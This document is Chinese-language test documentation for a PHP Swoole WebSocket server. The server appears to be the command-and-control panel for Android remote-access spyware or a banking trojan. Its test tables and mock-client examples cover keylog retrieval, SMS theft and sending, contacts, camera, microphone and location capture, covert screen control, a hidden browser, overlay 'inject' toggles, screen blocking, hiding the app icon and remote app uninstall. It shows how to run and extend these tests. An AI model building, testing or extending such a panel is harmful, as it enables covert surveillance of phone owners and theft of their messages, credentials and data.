# WebSocket 测试文档

> PHP Swoole WebSocket 服务器的完整测试套件文档。

## 测试概览

| 测试类型 | 框架 | 数量 | 位置 |
|----------|------|------|------|
| Unit Tests | Pest (PHP) | 84 tests | `app/tests/Feature/WebSocket/` |
| E2E Tests | Node.js | 16 tests | `app/tests/e2e/` |

## 运行测试

### Unit Tests (Pest)

```bash
cd app

# 运行所有 WebSocket 测试
./vendor/bin/sail pest tests/Feature/WebSocket/

# 运行特定测试文件
./vendor/bin/sail pest tests/Feature/WebSocket/DeviceHandlerTest.php

# 运行完整测试套件
./vendor/bin/sail pest
```

### E2E Tests (Node.js)

```bash
cd app

# 1. 启动 WebSocket 服务器 (后台运行)
./vendor/bin/sail exec -d laravel.test php artisan websocket:serve

# 2. 安装依赖 (首次)
cd tests/e2e && npm install

# 3. 运行测试
npm test

# 连接到不同服务器
WS_URL=ws://192.168.1.100:8081 npm test
```

---

## Unit Tests 详解

### 测试文件结构

```
tests/Feature/WebSocket/
├── CheckPhoneHandlerTest.php   # 设备列表查询 (14 tests)
├── DeviceHandlerTest.php       # 设备消息处理 (12 tests)
├── PanelHandlerTest.php        # 面板控制命令 (24 tests)
└── PanelSendHandlerTest.php    # 面板数据请求 (34 tests)
```

### CheckPhoneHandlerTest

测试设备列表查询功能。

| 测试组 | 测试项 |
|--------|--------|
| handle() | 空列表返回、用户设备返回、排除已删除设备、分页、页大小限制、最小页码 |
| filters | 按名称/国家/型号/无障碍状态过滤 |
| response format | 必需字段、分页元数据 |

### DeviceHandlerTest

测试设备端消息处理。

| 测试组 | 测试项 |
|--------|--------|
| handle() | 忽略无 pid 消息、新设备注册、已存在设备不重复注册 |
| ping handling | 心跳记录、设备状态更新 |
| message forwarding | SMS/屏幕/键盘日志/麦克风/缩略图/文件下载转发 |
| proxy message | 代理首次消息、代理状态消息 |

### PanelHandlerTest

测试面板控制命令。

| 测试组 | 测试项 |
|--------|--------|
| handle() | 忽略无 pid 消息 |
| join command | 订阅注册、离线状态返回 |
| ping command | 状态批量返回、连接关闭状态、未知状态 |
| disag command | 关闭设备连接、设备未连接处理 |
| screen commands | 点击/导航/音量/锁屏/键盘/粘贴/屏幕阻止/截图 |
| browser commands | 隐藏/普通浏览器 |
| proxy commands | 代理开/关 |
| broadcast commands | 警报/通知广播 |
| other commands | 搜索/聊天/未知命令转发 |

### PanelSendHandlerTest

测试面板数据请求。

| 测试组 | 测试项 |
|--------|--------|
| handle() | 忽略无 pid 消息 |
| screen commands | 屏幕共享 |
| camera commands | 摄像头开/关 |
| microphone commands | 麦克风开/关 |
| location commands | 位置开/关 |
| SMS commands | 短信请求、短信发送 |
| contacts commands | 联系人请求 |
| files commands | 文件列表/删除/下载/上传 |
| keylog commands | 键盘日志请求、按日期请求 |
| apps commands | 加载应用/打开应用/卸载应用 |
| activity records | 活动记录/通知/访问网站 |
| permissions commands | 权限请求 |
| device management | 重命名/删除/隐藏图标/通知 |
| dialog commands | 对话框 |
| inject commands | 注入开/关 |
| display commands | 显示 |

---

## E2E Tests 详解

### 测试文件结构

```
tests/e2e/
├── mock-device.js      # Mock 客户端 (MockDevice + MockPanel)
├── websocket.test.js   # E2E 测试用例
├── package.json        # Node.js 依赖
└── README.md           # E2E 测试文档
```

### 测试用例

| 测试 | 描述 | 验证点 |
|------|------|--------|
| Device can connect | 设备连接 | `isConnected === true` |
| Panel can connect | 面板连接 | `isConnected === true` |
| Panel receives checkphone | 设备列表 | `type === 'checkphone'`, `list` 为数组 |
| Panel can join device | 订阅设备 | `type === 'joinResponse'`, `pid` 匹配 |
| Panel receives device status | 设备状态 | `type === 'statusBatch'`, 状态有效 |
| Panel can request SMS | 短信数据 | `type === 'sms'`, 包含 `data` |
| Panel can request contacts | 联系人 | `type === 'loadcontacts'` |
| Panel can request files | 文件列表 | `type === 'files'` |
| Panel can request apps | 应用列表 | `type === 'loadapps'` |
| Panel can request location | 位置数据 | `type === 'loc'` |
| Panel can start screen share | 屏幕共享 | `type === 'screen'`, 包含尺寸 |
| Panel can send tap | 点击命令 | 命令发送成功 |
| Panel can send swipe | 滑动命令 | 命令发送成功 |
| Panel can send navigation | 导航命令 | 命令发送成功 |
| Device ping updates status | 心跳更新 | `phoneInfo` 存在 |
| Multiple devices can connect | 多设备 | 第二设备连接成功 |

### Mock 客户端 API

#### MockDevice

```javascript
const { MockDevice } = require('./mock-device');

const device = new MockDevice('device-id', {
    phoneName: 'Test Phone',
    model: 'Pixel 8',
    batteryCharge: '90',
    accessibility: '1',
    country: 'China',
    userEmail: 'test@example.com',
});

await device.connect();
device.sendPing();
device.disconnect();
```

#### MockPanel

```javascript
const { MockPanel } = require('./mock-device');

const panel = new MockPanel({
    userEmail: 'admin@example.com',
});

await panel.connect();

// 设备列表
panel.checkPhone();

// 订阅设备
panel.joinDevice('device-id');

// 数据请求
panel.requestSms();
panel.requestContacts();
panel.requestFiles('/sdcard');
panel.requestApps();
panel.requestLocation();
panel.startScreenShare();

// 控制命令
panel.sendTap(500, 800);
panel.sendSwipe(500, 800, 500, 200);
panel.sendNavigation('ho');  // ho=Home, bak=Back, rec=Recent

// 消息监听
panel.onMessage((msg) => console.log(msg));

panel.disconnect();
```

---

## 测试架构

```
┌─────────────────────────────────────────────────────────────┐
│                      Unit Tests (Pest)                       │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐  │
│  │ Mock Server │  │ Mock Conn   │  │ Handler Under Test  │  │
│  │ (Swoole)    │  │ Manager     │  │                     │  │
│  └─────────────┘  └─────────────┘  └─────────────────────┘  │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                     E2E Tests (Node.js)                      │
│  ┌─────────────┐       ┌─────────────┐       ┌───────────┐  │
│  │ MockDevice  │◄─────►│  WebSocket  │◄─────►│ MockPanel │  │
│  │ (ws client) │       │   Server    │       │(ws client)│  │
│  └─────────────┘       │  (Swoole)   │       └───────────┘  │
│                        └─────────────┘                       │
└─────────────────────────────────────────────────────────────┘
```

---

## 环境变量

| 变量 | 默认值 | 描述 |
|------|--------|------|
| `WS_URL` | `ws://localhost:8081` | WebSocket 服务器地址 |
| `DEVICE_ID` | `mock-device-{timestamp}` | Mock 设备 ID |
| `TEST_TIMEOUT` | `10000` | 测试超时时间 (ms) |

---

## 常见问题

### E2E 测试超时

**问题**: 数据请求测试 (SMS, Contacts 等) 超时失败

**原因**: Panel 在 Device 完全注册前发送请求，服务器找不到设备

**解决**: 在 join 测试后添加延迟等待设备注册完成

```javascript
await delay(500);  // Wait for device registration
panel.joinDevice(device.deviceId);
await delay(200);  // Wait for join processing
```

### Unit 测试权限警告

**问题**: `Permission denied` 写入 `.temp/test-results`

**原因**: Pest 缓存目录权限问题

**影响**: 不影响测试结果，仅为警告

---

## 扩展测试

### 添加新的 Unit Test

```php
// tests/Feature/WebSocket/NewHandlerTest.php
<?php

use App\WebSocket\Handlers\NewHandler;

describe('NewHandler', function () {
    beforeEach(function () {
        $this->handler = new NewHandler();
    });

    it('handles new command', function () {
        // Test implementation
    });
});
```

### 添加新的 E2E Test

```javascript
// 在 websocket.test.js 的 runTests() 中添加
await runner.run('New test case', async () => {
    const responsePromise = waitForMessage(panel, 'expected_type');
    panel.newMethod();
    const response = await responsePromise;
    
    if (response.type !== 'expected_type') {
        throw new Error(`Expected type 'expected_type', got '${response.type}'`);
    }
});
```
